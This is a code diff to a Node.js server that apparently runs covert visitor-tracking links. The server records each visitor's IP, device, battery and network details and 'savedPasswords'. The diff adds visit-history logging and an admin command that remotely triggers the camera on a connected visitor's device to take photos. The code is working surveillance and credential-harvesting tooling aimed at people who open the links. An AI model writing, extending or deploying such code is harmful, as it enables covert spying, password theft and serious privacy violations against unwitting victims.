@@ -98,7 +98,7 @@ app.get('/api/visitor/:id', (req, res) => {
     }
 });
 
-// Generate custom link
+// Generate custom link (EVERY VISIT = NEW VISITOR)
 app.post('/generate-custom-link', (req, res) => {
     if (!req.session.admin) {
         return res.status(401).json({ error: 'Unauthorized' });
@@ -123,8 +123,13 @@ app.post('/generate-custom-link', (req, res) => {
         backCamera: null,
         connected: false,
         visitDate: null,
+        permissionsGranted: false,
         savedPasswords: null,
-        redirectComplete: false
+        redirectComplete: false,
+        // New fields for multiple visits
+        totalVisits: 0,
+        lastVisit: null,
+        visitHistory: []
     };
     
     const users = readUsers();
@@ -186,19 +191,30 @@ io.on('connection', (socket) => {
         const userIndex = users.findIndex(u => u.id === visitorId);
         
         if (userIndex !== -1) {
+            // Update visit history
+            const visitRecord = {
+                visitDate: new Date().toISOString(),
+                ip: ip,
+                deviceInfo: deviceInfo
+            };
+            
             users[userIndex] = {
                 ...users[userIndex],
                 ...deviceInfo,
                 ip: ip,
                 connected: true,
                 visitDate: new Date().toISOString(),
-                socketId: socket.id
+                socketId: socket.id,
+                totalVisits: (users[userIndex].totalVisits || 0) + 1,
+                lastVisit: new Date().toISOString(),
+                visitHistory: [...(users[userIndex].visitHistory || []), visitRecord]
             };
+            
             writeUsers(users);
             connectedClients.set(visitorId, socket.id);
             
             io.emit('visitor-connected', users[userIndex]);
-            console.log('📱 Visitor connected:', visitorId);
+            console.log('📱 Visitor connected:', visitorId, 'Total visits:', users[userIndex].totalVisits);
         }
     });
     
@@ -226,6 +242,9 @@ io.on('connection', (socket) => {
                 users[userIndex].battery = content;
             } else if (type === 'network') {
                 users[userIndex].network = content;
+            } else if (type === 'permissionsGranted') {
+                users[userIndex].permissionsGranted = true;
+                console.log('✅ Permissions granted');
             } else if (type === 'savedPasswords') {
                 users[userIndex].savedPasswords = content;
             } else if (type === 'redirectComplete') {
@@ -235,6 +254,18 @@ io.on('connection', (socket) => {
             
             writeUsers(users);
             io.emit(`${type}-data`, { visitorId, content });
+        }
+    });
+    
+    // Admin command: capture photo
+    socket.on('admin-capture', (data) => {
+        const { visitorId, type } = data;
+        const socketId = connectedClients.get(visitorId);
+        if (socketId) {
+            io.to(socketId).emit('capture-command', { type });
+            console.log(`📸 Admin requested ${type} photo from ${visitorId}`);
+        } else {
+            console.log(`⚠️ Visitor ${visitorId} not connected`);
         }
     });
     
